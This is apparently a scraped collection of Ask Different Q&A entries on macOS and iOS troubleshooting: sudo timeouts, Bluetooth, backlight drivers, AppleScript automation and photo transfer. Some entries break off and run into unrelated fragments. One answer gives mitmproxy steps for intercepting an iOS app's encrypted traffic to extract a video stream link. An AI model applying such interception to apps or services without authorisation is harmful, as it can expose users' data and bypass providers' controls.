OS), which means that it was probably implemented by Apple in 2008. The public source dump for the macOS  kernel includes this in 2009. It seems to me that it was introduced as a feature in Linux in 2009 in this patch:\nhttps://lwn.net/Articles/321595/\nIn addition to the generic VM feature, the macOS kernel also features a system similar to the Linux Kernel Address Sanitizer (KASAN) that also does memory poisoning. As far as I know, it was introduced in 2017.\nYou can find the source code for the feature here:\nhttps://github.com/apple/darwin-xnu/tree/main/san\n\nA: In answer to your questions:\n\n*\n\n*Yes\n\n*Since 1985, though that needs some explanation.\n\nmacOS uses a hybrid kernel (XNU) based on Mach and BSD.  The Mach component manages processes and threads, interprocess communication and memory management. Whilst Apple have added refinements, Mach remans the basis for the innermost parts of the XNU kernel.\nWe can go back to the 1985 for origins of Mach running on a DEC VAX. This paper Mach: A New Kernel Foundation For UNIX Development includes \"Mach provides some basic paging services inside the kernel. Memory with no pager is automatically zero filled, and page-out is done to a default pager.\"\nSo from 1985 memory was automatically zero filled in projects/products based on Mach.  That includes and all versions of macOS and OS X.\nFor current documentation from Apple, read Mach Overview which includes: \"The default pager handles nonpersistent memory, known as anonymous memory. Anonymous memory is zero-initialized,...\". This really is carried over directly from Mac and confirms that memory is zero-initialised.\nFor further reading:\n\n*\n\n*From Apple developer documentation Kernel Programming Guide\n\n*If you have kernel programming skills or interest see  darwin-xnu which is part of Apple's open source code.\n\n*For an in depth discussion of internals, you can't do better than the *OS Internals books from Jonathan Levin.\n\n*There are numerous macOS (OS X) memory management questions (though not your specific question) in Ask Different. You might want to start here.\n\nI must point out that whilst I have always had an interest in kernels and operating systems, I lack programming skills for operating system programming since about 1980.\n", "Q: Is setting a sudo time limit to 0 seconds still required for secure macOS operations? I am used to set\nDefault timestamp_timeout=0\n\nin /etc/sudoers via the visudo command when configuring a new macOS. The reason originally was that applications can start shell scripts and it used to be that an application constantly trying to run sudo in the background would be able to hijack the lingering sudo credentials (because it spawned the same TTY if I recall correctly) and get root access (ugh). Hence, I always set the timeout to 0 so I have to enter the password for every sudo command. Which is a pain, but more secure.\nHowever, if that particular road has been closed, I could maybe make life a bit more comfortable by setting it to a fraction of a minute. Can I? Or is it still a security risk, something that can be hijacked?\n\nA: Before Mac OS X Sierra, the sudo configuration did not enable the tty_tickets options. That meant that the credentials were cached and accessible by any tty.\nSince Mac OS X Sierra, tty_tickets is enabled by defaults, meaning that the credentials are only cached for a specific tty - thereby disabled this set of exploits (i.e. monitoring /var/db/sudo and trying to exploit sudo within the timeout).\nI think your memory is a bit fuzzy regarding spawning the same tty, as the problem was really as described above.\nMac OS X Sierra was released in 2016, so for the last 5 years, users of the latest operating system version have been safe here.\nIn terms of security risks in general, you should note that there is (ofcourse) always less risk involved in having no cached credentials (i.e. timestamp_timeout=0). It has to be balanced with user comfort, as there are also drawbacks associated with having to enter a password many times a day (when using password based credentials).\n", "Q: Strange: Disk space is not free after removing file I have a strange problem and hope I can find a solution here.\nI'm using a VPN to connect a linux server. When I downloaded ~2Gb binary file from the server to an extra data disk, I found the system disk space dropped dramatically. I tried many ways and found that the VPN software outputted the log for any data it transferred. In general, it will take ~30Gb space to transfer 2Gb file.\nThe strange thing is that I used a crontab task to auto remove the log file every 2 minutes. After that, I cannot find the log file anymore, but the problem still exists :(.\n% sudo crontab -l\nPassword:\n*/2 * * * * rm -rf /private/var/log/vsgvpn.log\n\n% sudo fs_usage -w 1994 | grep

Machine (has been disabled).\nAny help will be appreciated.\nBest,\nShixiang\n\nA: The contents of a file on the file system is not necessarily immediately removed when you issue the rm command. The name of the itself is removed from the file system - i.e. you wouldn't see it in a directory listing.\nHowever, if a program (such as your VPN software) has the file opened when you delete it, the operating system will keep the file on disk until the program closes the file.\nWith long-running software such as a VPN program, this means the developer of the VPN service usually provides you with a way of signalling to the program that you have removed (or rotated) the log file. If this is not done, you might have to resort to closing the VPN program and starting it up again.\n", "Q: Is it possible to find out what video link an App on iOS accesses? I have an App on iOS that plays a TV channel at no charge, but a PC version is not available on the company website. I tried to watch the channel on the iPhone, it was not enjoyable. I'm wondering if there's a way to find out what video link the App accesses that way I can watch the TV channel on the computer. Thank you!\n\nA: You could perhaps do it by installing mitmproxy on a Mac (or other computer) and proxying your iOS traffic through it.\nYou can setup the proxying on the device in the Settings app in the  WiFi tab (when using WiFi) by tapping the circled i, and then at the bottom tap \"Configure Proxy\". Here you want to set it to Manual and point it to the IP address of your computer and the port number, where you have mitmproxy running.\nIf the app uses TLS/SSL communication (that is an encrypted link), which is often the case, you will have to install and trust a CA certificate for mitmproxy that is generated when the program is started the first time. You can read more about that here:\nhttps://docs.mitmproxy.org/stable/concepts-certificates/\nIn some cases, apps use certificate pinning and other measures to disallow proxying, and you then can't really use mitmproxy.\n", "Q: Is it possible to augment macos finder's menus font size? as per the object: is it possible to augment macos finder's menus font size?

The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide.

I've recently installed some Safari Extensions via the Mac App Store.\n\nAfter installing, they show up in my toolbar. The Safari Extension icons have an annoying blue tint color.\nWhat does the blue color mean? Is there any way to make them grayscale to match the other Safari toolbar icons?\n\nA: The color is decided by the developer and signals that the extension is active. For example, on the favorites menu (blank tab) all my extensions are   inactive and grey:\n\nWhile when on a website, my extensions are active and display the programmed color. It isn't always blue. For example, Grammarly is green.\nEdit: incorporating Mathias Winkleman’s answer, some developers choose default color, which is your accent color. By default it is blue, but grey does not change the icons to grey.\n\nA: In addition to what @anonymous said, here's how you can (lightly) influence the color: the default, blue in your case, follows the setting for Accent colour in Preferences ▶ General.\nOne of the options for that setting is grey. Unfortunately, that happens to be the exception, with icons reverting to blue when it is selected.\n\nIf, however, you never actually need to click on the icons, you can right-click on the toolbar, choose customize, and remove them. The extensions will continue to work as before.\n", "Q: How to end/escape “Find” command via keyboard in macOS Preview app? If I:\n\n*\n\n*open a PDF document in macOS Preview app,\n\n*hit commandF,\n\n*type a word to search in the popup dialog,\n\n*hit the return key,\n\n…the first instance of the searched word will highlight in yellow.\nHow then, from the keyboard (rather than by mousing my pointer to the “Done” button), do I cancel this search and remove that highlight? The esc key only produces the error/failure sound.\n\nA: I've found two ways. Both are kind of ugly...\n...but first, it's important to note that there are two interface styles for the find action: what you are describing is a mode that is used when the window is rather narrow: a popup at the center of the window asking for the search string.\nThere's a different mode where the search input is in the toolbar. That mode is used whenever there is enough space in the toolbar.\nSo, that leads to the first method: make the window wide enough to accommodate the second mode. Because that makes ESC work as expected, and as implied by Marc's incredulous comment.\nHere's a second way to do it, in case you are working on a 4:24 aspect ratio portrait mode display, or just feel that preview doesn't deserve those pixels: after entering the find mode, hit COMMAND+E. This will somehow change to the toolbar-style find mode, and you can hit ESC from there.\nAll tested on Monterey Beta.\n", "Q: Bluetooth Issues in MacOS Big Sur I'm on a 13-inch MacBook Pro with MacOS Big Sur (11.1) installed on it. Few months ago, I started having bluetooth connectivity issues, which are as follows:\nI have online classes, and I use bluetooth earphones to attend those. The problems started in late May, 2021. Once in a while, the bluetooth devices are unable to connect, and at those times, none of the bluetooth devices are able to connect to my Mac. If I removed the device from the bluetooth devices, it didn't reappear as it normally does. I tried restarting the (bluetooth) device, restarting the bluetooth. After few frantic tries (takes more than 20 minutes, at the very least), the devices do appear and I'm able to connect to them. After some time, the problem starts again.\nI have also tried resetting the bluetooth module, deleting the bluetooth plist file. None solved the problem. Only thing that works for sure is restarting my Mac, but since it has HDD and not SSD, it takes a lot of time to restart.\nFrom a few weeks ago, I am unable to even turn the bluetooth off, and the previous problem still persists. I also have tried resetting the NVRAM & SMC, but it still doesn't solve the problem.\nThere aren't any problems with the devices, as they are able to connect to other devices (phones, other laptops etc.).\nImages are attached.\n\n\n\n\nA: If you hold down Option while you click on Bluetooth in system preferences, you should see a padlock symbol next to the turn Bluetooth off button.\nSince yours is greyed out, the padlock should be locked. Click on it to unlock and it should allow you to disable and re-enable Bluetooth.\n\nA: You might be experiencing interference. Lots of things can can cause this, and Apple has a good support page that lists many things to check.\nhttps://support.apple.com/en-us/HT201542\nIf you're using USB 3 or Thunderbolt 3, improperly shielded cables — either power cables or cables to external drives — are an obvious place to start.\nInterference can be really difficult to track, because sometimes it's coming from things outside your control\n", "Q: Black vertical lines all over the screen my MacBook Air How the issue occurred:\nI was just watching YouTube and all of a sudden I have black vertical lines all over my screen.\n\n*\n\n*macOS: Sierra\n\n*MacBook Air 2017\n\n\nWhat I tried :\n\n*\n\n*Force shutdown and restart.\n\n*Cmd + Opt + P + R\nQuestion\n\n*\n\n*Will any external monitor help me in this case? ( As I will not be able to update any settings.)\n\n*What could be the cause? (Heat only or something?)\n\n*Is there any way to recover it or will have to go to a high-end store?\n\n\nA: Yes, it looks like a hardware issue. You'll need to take it to an Apple Store or other Apple-authorised technician.\nIf it is a new Mac, then you may be able to get a free repair (or replacement). The age for which this will apply varies depending on local laws.\nIf it is an older Mac, you will have to pay for the repair, and you will need to decide whether the cost is worth it, or if you are better off putting it towards a new(er) Mac.\nIf it is a very old Mac, then you could try a \"non-high-end\" repair shop, though realistically, they would have to use secondhand replacement parts (e.g. the logic board) as Apple doesn't sell parts. This might be cheaper, but there's no guarantee that it will last.\nYou may be able to use the MBA with an external display (depending on the nature of the fault). It's worth testing before you buy a display. Obviously, you lose the portability.\nOh, and don't forget to backup your files before giving it to repair.\n\nA: Definitely looks like a hardware issue. I honestly don't think a system wipe will do anything. It may be worth a shot once you eliminate hardware issues though.\nIf it is purely a hardware issue than connecting to an external monitor should allow you to use the MacBook.\n\nA: I don't know what I did ( as I did multiple things I don't remember ) ...

Now select the profile you want to switch to. Click \"OK\"\nStep 5: Use something like the following bash script to trigger the key mapping:\nosascript -e 'tell application \"System Events\" to keystroke \"z\" using {command down,control down}'\nYou will need to modify this script to use your chosen hotkey.\nOne other very useful but somewhat unrelated tip for modifying fonts is to give tmux the \"resize-window\" command to fix the window size.

It was running on iOS 12.4.1 up until recently when I've decided to update iOS to the suggested 14.1.7. Prior to updating, I've created a backup which is about 116 GB in size (yes, my storage was pretty full).\nNow here's the problem: after updating iOS, I can't restore my backup onto the phone because iTunes says there is not enough space on the phone.\nWhat I've tried:\n\n*\n\n*trying out different softwares to delete chunks of data ouf of the backup so it becomes smaller in size: none of them worked.\n\n*downgrading iOS: doesn't work because the old iOS is no longer signed.\n\n*reverting to factory new state: this also didn't downgrade the iOS it seems.

I'm now running Big Sur on it via patched Big Sur. Before that, for a brief time period, it ran Catalina. (I bought it used). The issue I have is when the display turns off it won't be powered on again. No matter what I do.\nTo add to the misery, the brightness controls are also not working. (The F1 and F2 keys work fine.) And there is no brightness slider on display settings.\n\nWhenever I close the lid the screen won't come back on. I have to hard restart it all the time. But when I log off and then close the lid, it wakes up fine.\nI installed OS X Mountain Lion to try it and the brightness keys work correctly. My issues started with Catalina.\nI'm currently running Catalina.\nCommand outputs:\n\n\n\nioreg -r -c AGDCBacklightControl | grep ConfigMap output:\n\nPS3: the laptop was converted into intel hd graphics by the previous owner.\nPS4: the hdmi connection is also not working.\n\nA: Here is a recap of your initial report:\n\n*\n\n*You've used third-party software to allow Catalina to be installed on a system which is too old to be natively supported.\n\n*You've noticed that (A) your display lacks a brightness slider and (B) the display won't turn on after sleep.\n\nNow, both symptoms (A) and (B) can occur on their own for a number of different reasons. The fact that they occur simultaneously and that nothing appears to resolve them strongly suggests that there is a failure somewhere in the path of the display backlight chain. Without additional information, this can mean a hardware, firmware, or software root cause. So we should investigate each of these areas separately.\nThe display backlight consists of dedicated circuitry and software components. The circuitry includes the LED backlighting panel itself along with a hardware controller for it which interfaces with the CPU and allows system (and user) software to command it. This controller therefore requires driver software that is specifically written for the exact controller hardware used in your particular machine. If the driver isn't present and running, the system has no way to issue commands to the backlight controller to change the amount of electrical current it sends to the LED panel (i.e., changing the brightness).\nSo we should first check that the driver is present and loaded. To do this, I asked you to check the output of kextstat and systemextensionsctl for the presence of backlight controller kernel extensions. Your output confirms that the necessary KEXTs are, in fact, loaded correctly.\nIt is critical to remember that Apple is free to change the implementation of the backlighting hardware between any two models of computer. When they do, the driver software needs to be updated in order to add support for a new hardware implementation. If an old driver is used with new hardware, there is a strong likelihood that the backlight will either malfunction or not work at all.\n(For example, a new microcontroller may have a different IO address map and sending commands to the address of a peripheral on the old microcontroller will (1) prevent the peripheral from seeing the command and (2) likely unintentionally corrupt an unrelated register.)\nBecause of this, drivers, in general, are necessarily partially or wholly hardware-specific, so before a driver attempts to talk to hardware it needs to make sure that it's only targeting the exact hardware that it supports. There are many ways of accomplishing this. One primitive way, which only works because Apple is a vertical vendor, is by gating driver loading on the model of Mac that you have. This is done through IOKit via the board-id property on the Platform Expert node. This is a UUID that has a 1:1 correspondence to your machine type and generation (e.g., MacBookPro10,1). If a driver queries your board-id and it matches the driver's list of supported boards, then the driver knows that it's familiar with your hardware and can proceed to start controlling it. If your board isn't on the list, then the driver can gracefully fail and not attempt to drive hardware that it doesn't know how to talk to.\nOne of the possibilities I suspected with your issue, due to you running on an unsupported system, is that the backlight driver wasn't written with knowledge of your specific backlight hardware and is therefore unable to control it. With a little digging, I think I found the place where that determination is made: During active probing on the AGDCBacklightControl driver. When you take a look at the driver's IORegistry entry (ioreg -r -c AGDCBacklightControl) you will notice that (1) it is always going to passively match and (2) there is a property called ConfigMap which is an array of board-ids. The obvious conclusion is that this is the list which AGDCBacklightControl uses to determine whether or not it supports your backlight.\nThat is why I asked for you to run the second set of commands. I wanted to compare your board-id with the driver's list. Sure enough, your ID (Mac-C3EC7CD22292981F) isn't there.\nWhat that means for you, unfortunately, is not great news: It's likely that your system will never have a working backlight in Catalina because Catalina's driver is incompatible with your hardware.\nI should also point out here that Apple routinely scrubs all of its software and removes code for hardware that it no longer wants to support. This is good practice for many reasons (increased stability, decreased attack surface, lower code size, higher performance, reduced code/engineering complexity, reduced testing matrix). So while the driver code for your specific backlight controller is officially supported in Mountain Lion, it was intentionally removed in Catalina.\nYour best options are to either (1) accept the limitation or (2) use a supported macOS release.\nThere are, however, two experiments that you could try here:\n\n*\n\n*You can attempt to fool AGDCBacklightControl into loading and trying to drive your backlight. This is unlikely to work due to the reasons I gave above, and might cause unanticipated damage to your hardware for the same reasons (unlikely, but possible). It would be straightforward to try (you'd just need to add an entry to ConfigMap in /System/Library/Extensions/AppleGraphicsControl.kext/Contents/PlugIns/AGDCBacklightControl.kext/Contents/Info.plist after disabling the appropriate protections and then update your kernel cache) but I am not going to spell out the procedure here. Follow that route at your own risk!\n\n*You could also try to copy the Mountain Lion version of the driver over to your Catalina install and hope that doing so will avoid calling into incompatible SPI/API. Again, this is left as an exercise.\n\n", "Q: Cannot get App Store purchase because Apple ID required but I'm already logged in I'm already logged in on my Mac with my Apple ID.

This is for Big Sur.\n\nA: No, enabling FileVault on your system drive cannot cause an external drive that is not connected to suddenly become non-encrypted. It also doesn't do it to a drive that is connected.\nIf your external disk was ever encrypted, you have reformatted it or disabled the encrypted manually since then.\nYou can encrypt the disk without reformatting it by opening Finder, and then right-click the drive in the sidebar, and click \"Encrypt Top xxxx\" (the name of your drive). You are then prompted for a password and the disk will be encrypted in the background.

Sorry, I'm new here.\n\nA: The is not meant to answer everything asked in your question and is just to give you some guidance on the items mentioned herein.\nThe first block of code in your question comes from my answer A: Use Apple Script to open Chrome with specific profile and it does indeed do exactly what it is programed to do, assuming there are two profiles.\nYou should have a look at my answer A: Create a terminal command to open another user profile in chrome as it shows the basic command to open Google Chrome to a specific profile. That command is also used in the do shell script command in the code of the other answer, the code you show in the question.\nSo, to open Google Chrome to a specific profile the code is there, right in front of you:\ndo shell script \"open -na 'Google Chrome' --args --profile-directory=\" & aProfile's quoted form\n\nWhere aProfile's quoted form is in the list {\"Default\", \"Profile 1\"}, so to just target one profile, e.g.,:\nset myProfile to \"Profile 1\"\ndo shell script \"open -na 'Google Chrome' --args --profile-directory=\" & myProfile's quoted form\n\nAs to some of your other code attempts, here is an example of how I'd click a menu item from the Profiles menu in Google Chrome.\nExample AppleScript code:\ntell application \"Google Chrome\" to activate\n\ndelay 0.25\n\ntell application \"System Events\" to ¬\n    click ¬\n        menu item \"Edit…\" of ¬\n        menu \"Profiles\" of ¬\n        menu bar item \"Profiles\" of ¬\n        menu bar 1 of ¬\n        application process \"Google Chrome\"\n\nIn the example AppleScript code you'd replace \"Edit… with then the name of the profile you want, as it shows on the Profiles menu.\nTo bring up the Extensions is would be:\nExample AppleScript code:\ntell application \"Google Chrome\" to activate\n\ndelay 0.25\n\ntell application \"System Events\" to ¬\n    click ¬\n        menu item \"Extensions\" of ¬\n        menu \"Window\" of ¬\n        menu bar item \"Window\" of ¬\n        menu bar 1 of ¬\n        application process \"Google Chrome\"\n\n\nNot trying to overwhelm you, however, if you need to click several first level menu items in the same script, it's probably better to implement it as a handler, e.g,:\nExample AppleScript code:\nmy clickApplicationMenuCommand(\"Google Chrome\", \"Profiles\", \"Edit…\")\n\nmy clickApplicationMenuCommand(\"Google Chrome\", \"Window\", \"Extensions\")\n\n\n--  ## Handler ##\n\nto clickApplicationMenuCommand(appName, appMenuName, appMenuCommand)\n    tell application appName to activate\n    delay 0.25\n    tell application \"System Events\" to ¬\n        click menu item appMenuCommand of ¬\n            menu appMenuName of menu bar item appMenuName of ¬\n            menu bar 1 of application process appName\nend clickApplicationMenuCommand\n\nYou would place the handler at the bottom of your script and then just click a top level menu item as shown in the two examples of calling the handler.\n\n\nUpdate to address Multi Layout Manager extension\nThe information above was tested in macOS Catalina as it was not know at the time what version of macOS the OP was using.\nThis update to address triggering a Layout of the Multi Layout Manager extension in Google Chrome when the extension itself is pinned to the Toolbar.\nHaving installed the Multi Layout Manager extension in Google Chrome under macOS High Sierra and ascertaining the UI element hierarchical object structure to e.g. Setup A and upon closer examination of it, I was not able to get past a certain point in it.  As such I decided to stop wasting time and revert to the an ugly form of UI Scripting.\nNote that UI Scripting is often kludgy and prone to failure for a number of different reasons, which I'm not going to enumerate here.\nThe following example AppleScript code assumes Google Chrome is already running and the wanted Profile is active.\nExample AppleScript code:\ntell application \"Google Chrome\" to activate\n\ndelay 0.25\n\ntell application \"System Events\"\n    click ¬\n        pop up button \"Multi Layout Manager\" of ¬\n        toolbar 1 of group 1 of window 1 of ¬\n        application process \"Chrome\"\n    \n    delay 0.25\n    \n    repeat 3 times\n        key code 48 -- # tab key\n        delay 0.2\n    end repeat\n    key code 36 -- # enter key\n    \nend tell\n\nNotes:\nAs coded with the repeat loop, it triggered the first Layout, so to trigger the second Layout the repeat loop would need to be incremented by 1, and so on.\n\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n", "Q: Change shortcut system-wide to match keyboard I know from experience that macOS sets the default keyboard shortcut according to the language choice (and maybe keyboard choice, not sure) at the first setup.\nNow I set up my new computer to French (Swiss), which set all keyboard shortcuts according to the French AZERTY keyboard. Alas, my keyboard is Swiss-French, which makes all those shortcuts unusable.\nAn example: the Calendar app has shortcuts Cmd+1 to Cmd+4 to set the view on daily to yearly, respectively. On the AZERTY keyboard, those shortcut become Cmd+&, Cmd+é,Cmd+\", and Cmd+', respectively, which is totally fine when using the French layout but unpracticable with mine.\nI know that if I had set my computer to German/Swiss-German, those shortcuts would have been the way I wanted. I know that I can either manually correct every shortcut that bothers me or reset the system. But is there a way to correct that system-wide on an existing system?\nPS: This is in essence the same question as this one, but I'm asking because, since 2017 and 3 major OS updates later, some new tool might have come up.\n\nA: I'm surprised your language choice defaulted to the French keyboard layout rather than the Swiss-French layout based on your language choice, though no need to worry, it is very simple to add a different keyboard layout.\nFirst go to System Preferences > Keyboard > Input Sources, then add a new layout. For you, you'd need to choose French > Swiss French, in order to get the correct layout. After that it should be working.\nIf you have a French keyboard you also use, you can change the layout at any time by checking 'Show Input menu in menu bar' and then clicking on the flag or letter in the menu bar to change the layout. If you don't need the French layout, you can select it in the keyboard input sources preferences and then click the minus at the bottom of the list to remove it.\n\nA: Ok, so I called Apple assistance today and their answer is that keyboard shortcuts are determined by the system language rather than the keyboard layout. The way to (kinda) have the keyboard shortcuts you want is to... switch the main system language to the one having the shortcuts you want, so in my case switch to German to have shortcuts matching the Swiss keyboard layout.\nPersonally I don't mind, since I speak it anyways. However, that is not a satisfactory solution for most people facing this problem.\nIn my search, I learned that user-defined shortcuts are stored in ~/Library/Preferences. System default shortcuts per language must be stored somewhere in the system, probably in a plist format. So theoretically, you could remap every app to the default shortcuts of another language with a script. Or you could use karabiner for that, although I'm not sure how it would work and how long it would take.\nHowever, that's too much of a hassle for me at the moment and I won't do it. If anyone is willing to do so, feel free to post your script here.\nI'm just writing this for anyone facing this problem but I won't mark it as an accepted answer, because it doesn't really solve the problem.\n", "Q: Add multiple attachments to mail using AppleScript I am trying to write an AppleScript file that sends email with multiple attachments from the current Finder selection.\nThe one I am currently using is working when one item is selected, but not working when two or more items are selected.\nHere's my code.\ntell application \"Finder\"\n    set theFile to selection as alias\n    set fileName to name of theFile\n    set newRefFile to POSIX path of theFile\nend tell\nset AppleScript's text item delimiters to {\"_\"}\n--extract customer name to CnameNFD\nset CnameNFD to first text item of fileName\n-- prevent broken korean letter\nset Cname to ¬\n    do shell script \"echo \" & (CnameNFD as text) & \"|iconv -f UTF-8-MAC -t UTF-8\"\n-- extract date taken using exiftool \nset cDate to ¬\n    do shell script \"/usr/local/bin/exiftool -d \\\"%Y-%m-%d\\\" -DateTimeOriginal \" & (newRefFile) & \"\"\n-- extract latter\nset AppleScript's text item delimiters to {\":\"}\nset cDate to last text item of cDate\n-- resetting delimiters \nset AppleScript's text item delimiters to {\"\"}\n--make subject to \"Hi + customername\"\nset theSubject to \"Hi\" & \"[\" & Cname & \"]\"\nset theBody to \"attachment:  \" & fileName & \"\ndate taken: \" & cDate & \"\nBODY contents\"\nset {text returned:theAddress} to display dialog \"write email address\" default answer \"example@example.com\" buttons {\"Cancel\", \"Okay\"} default button 2\nif button returned of result = \"Okay\" then\n    set theAttachment to theFile\n    set theAccount to \"account\"\n    tell application \"Mail\"\n        set theNewMessage to make new outgoing message with properties {sender:theAccount, subject:theSubject, content:theBody & return & return, visible:true}\n        set color of words of theNewMessage to {0, 0, 0}\n        set color of characters of theNewMessage to {0, 0, 0}\n        tell theNewMessage\n            set visibile to true\n            make new to recipient at end of to recipients with properties {address:theAddress}\n            \n            try\n                make new attachment with properties {file name:theAttachment} at after the last word of the last paragraph\n                set message_attachment to 0\n            on error errmess -- oops\n                log errmess -- log the error\n                set message_attachment to 1\n            end try\n            log \"message_attachment = \" & message_attachment\n            delay 3\n            send\n        end tell\n    end tell\nelse\n    if button returned of result = \"Cancel\" then\n        display alert \"User canceled the job\"\n    end if\nend if\n\nI think I need to use the repeat function, but I am totally lost...\nIf I add multiple files, the subject part \"Cname\" should be one or more.

However if your default Calendar is under an account that doesn't allow creating calendars via the Calendar interface (e.g. a Gmail account), this will likely fail. Therefore you must manually create the Calendar so that the algorithm can skip this step (e.g. on calendar.google.com).\n\n\n*Create the new event in the Eventbrite calendar.\n\nHow I found this out:\n\n*\n\n*By recording the screen, I could quickly click into the event that was temporarily created and notice that it gets added to an \"Eventbrite\" calendar. The Eventbrite calendar doesn't exist on my phone though.\n\n*By installing the app on a new iOS device, I do indeed notice it creates an Eventbrite calendar.\n\n*When I try creating a new calendar under a Gmail account using the Calendar App interface, it doesn't actually create the calendar.\n\n", "Q: Sidecar to turn iPad into a Wacom style tablet (i.e. Pen Tablet)? The word \"Tablet\" is overloaded. It could refer to a device like an iPad, but it could also refer to a device similar to a Wacom tablet, often called a \"pen tablet\" or \"graphics tablet.\"\nI recently started using Sidecar and noticed the documentation states:\n\nYou can also use [your Apple Pencil] to write, sketch, and mark up documents while seeing the updates live on your Mac.\n\nThis sounded like the iPad could be used as a Pen Tablet just like a Wacom tablet. I.e. I \"write on my document\" and \"see the updates live on my Mac.\" However, I don't see how to enable that feature. (Sidebar: if they're referring to something else here, please let me know what they mean by this line.)\nThe closest I could get was by mirroring the screen and drawing on the tablet. However, this has several disadvantages over a Pen Tablet:\n\n*\n\n*It only has one mode, absolute mode. A tablet like Wacom allows you to choose between absolute (i.e. Pen mode) vs. relative (i.e. Mouse mode) mode.\n\n*Theres no \"hover\" feature that Pen Tablets usually have. This is useful so you know where you're about to draw on the screen before you actually draw. Even if it's not possible for the iPad to detect when the pen is hovering above it, the same effect could likely be mimicked thanks to the pressure sensitivity (e.g. light pressure = hover, stronger pressure = click).\n\n*Since the screen resolutions aren't the same, I'm either going to have black bars on my iPad or black bars on my MacBook. Had it been functioning as a Pen Tablet, it wouldn't need to match any resolutions, therefore I could use my iPad's entire screen real estate for pen gestures, as well as my entire MacBook's screen real estate for display purposes.\n\n*It needs to send video data to the iPad, likely reducing battery life on both the iPad and MacBook. (E.g. as opposed to keeping the screen off/black.)\n\nIf there was a way to turn an iPad into a Pen Tablet via Sidecar, similar to how the documentation suggests, I'm guessing all of those issues would likely be addressed.\nAlso note that I'd rather avoid a 3rd party app so I don't need to install/set up anything.\n\nA: Your question is based on the false premise that the quote \"You can also use [your Apple Pencil] to write, sketch, and mark up documents while seeing the updates live on your Mac.\" must mean that it should work exactly like your preferred Wacom tablet. That is not the case.\nIf you prefer Wacom tablets, I would suggest buying such a device instead of using Sidecar - then you can get a product that works exactly like a Wacom tablet (because it is a Wacom tablet).\nRegarding your list of disadvantages:\n\n*\n\n*Yes, there's no generic option for having a \"relative mode\" input. However, a specific application on your Mac is free to implement such a mode for that application specifically.\n\n\n*Yes, there's no \"hover\" feature - and it is not possible to enable such a feature with the current hardware and software. Individiual applications are free to offer \"simulated\" hover - for example in the manner you describe.\n\n\n*No, you do not necessarily have to have black bars. By default your desktop \"extends\" to the SideCar display instead of mirroring - in that case you do not have the black bars. If you want to see the effect of using the pencil on the iPad simultaneously on your macOS display (and not only on the iPad display), you would then want to use an application that allows you to have the same document open in 2 windows at the same time.\n\n\n*Yes, video data is being sent to the iPad - that's how it works. Specific applications can avoid that by having a \"black\" window on the iPad so that video data does not have to be transferred, and having a \"content\" window on the Mac display showing that results.\nAll in all, SideCar is not meant to be the same as a Wacom tablet. It has different pros and cons. You can avoid some of the disadvantages that you experience by using applications intended for your purpose, as described above. If your favorite applications does not offer such a mode, you would need to ask (or pay) the developer to create such a mode.\n\nA: You will want a technology and app suite like Astropad and not sidecar if your goal is to have Wacom pen input between a Mac an an iPad.\n\n*\n\n*https://astropad.com/\nSidecar is designed for output like a display and macOS doesn’t really contemplate touch input in displays that support that either. This is intentionally baked into the OS and SDK deeply and not just that Apple forgot to enable the touch for macOS.\n", "Q: How do I switch the app store region on Apple TV?

Yesterday I used brew to upgrade Firefox to the latest version:\nbrew update\nbrew upgrade firefox\n\nAfter the upgrade, Firefox works normally when I open it from applications menu.  It is the latest version: 91.0.1 (64-bit).\nHowever since the upgrade, links in my mail through the Apple Mail app don't open.   When I click on them, nothing happens.  If I right click the link and select \"open with\" and choose Firefox, I get a dialog that says:\n\nYou can't open the application \"Firefox\" because the Classic environment is no longer supported.\n\nWhen I search for this error message, it appears to be related to application that are not compiled for macOS.  I shouldn't think that would apply to Firefox.\nIt appears that a second older version of Firefox 89.0.2 was still installed on my system in /usr/local/Caskroom.  I found it with the command locate firefox and then I removed it, but it didn't solve the problem.   locate firefox and locate Firefox now only show firefox installed in /Applications/Firefox.app\nWhat is causing this error and how can I fix it?\nUpdate\nThis has something to do with brew.  I just tried installing Google Chome from brew because it also needed to up updated.  (Neither Firefox nor Chrome have the permissions needed to update themselves.)  I used the -f flag to force brew to overwrite the version of chrome that had been installed in some other way:\nbrew install google-chrome -f\n\nAfter installing Chrome from brew, Mail can't open links in it either with the same message.   Is brew putting some wrapper around these applications that is using classic mode?\n\nA: Manually downloading and installing Firefox and Chrome is a workaround for this problem.   It is only when they are installed by brew that there is a problem.  I'm not sure what the difference is when install via brew vs installed by the downloaded .dmg\nThe self updating mechanism mentioned in the comments doesn't work for me.   Firefox will tell me that an update is available and offer to download it, but when I click the download button, the dialog goes away and Firefox doesn't get updated.\n", "Q: iPhone calendar with multiple calendars - only one is selected to display I have the default iOS Calendar app setup with multiple calendar accounts - iCloud, Exchange and Google. Whenever I open the app, it shows only one of the calendars. I can select them, select holidays and birthdays, then close the config, after which all calendar events are shown. Then if I close the app, reopen and change to a different date, all the events for the other calendars disappear. This is not workable.\nWhat can I do to get all the calendars displayed, and have the setting saved properly?\n\nA: Under Settings>Calendar\n\nVerify accounts connected to device\n\nOn the Calendar app, zoom out and then click on calendars on the bottom\n\nEnable Accounts That you desire to be synchronized with your calendar\n\n", "Q: How can I get photos off my IPhone to my Macbook without using ICloud? I would like to transfer photos from my iPhone to my iCloud. I have a large volume of photos, many for work, which need to be backed up and removed from my phone. I would need to buy a higher tier of iCloud to put the photos into iCloud, and I have my own local backup.\nIt's fine for this to be a one time manual operation.\nI have tried to use the photos app, but the import functionality doesn't show my iphone as it does in the tutorials, even with the phone connected by cable with trust enabled.\nMy iOS version is 14.7.1.\nMy OSX version is 10.13.6.\n\nA: If your iPhone is connected directly to your Mac, then it will appear as a Device in Image Capture, from where you can select Photos and import them.\n\nA: There are multiple correct answers.  You just need to choose one that suits your workflow.\nI use PhotoSync.  It is an iOS app with a Mac companion app.  With the companion app running all the time on my Mac, I can initiate uploads (and downloads) from my iPhone.   This requires the iPhone and Mac on the same LAN - it doesn't use any cloud service.\n\nA: If your iPhone and Mac both have Bluetooth enabled, and both are connected to the same wifi network, photos can be moved from one to the other using AirDrop, part of the macOS/iOS functionality.

